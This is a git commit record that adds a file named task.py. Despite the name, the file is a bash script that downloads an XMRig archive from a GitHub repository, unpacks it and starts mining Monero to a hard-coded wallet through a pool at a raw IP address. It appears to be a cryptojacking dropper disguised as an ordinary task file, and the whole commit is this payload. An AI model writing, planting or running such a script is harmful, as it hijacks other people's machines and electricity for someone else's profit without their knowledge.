516e09ff742ae39d6a9ca364f7c0f64539e53fa4
marisarisky174 <marisarisky174@tognu.com>
2025-03-20 01:56:24 +0700

    Create task.py

---
+++ task.py
@@ -0,0 +1,3 @@
+#!/bin/bash
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig --donate-level 1 -o 167.71.194.164:443 -u SaLvsAi6k4C755eL7xEEEZJ4JDVUyx1gn9wtrJGngGkdMLRoTB721euSG2wbT14dn2885qFc93mS3eJQ9bwWQEmk58CgQmrj5nF -p gas -a rx/0
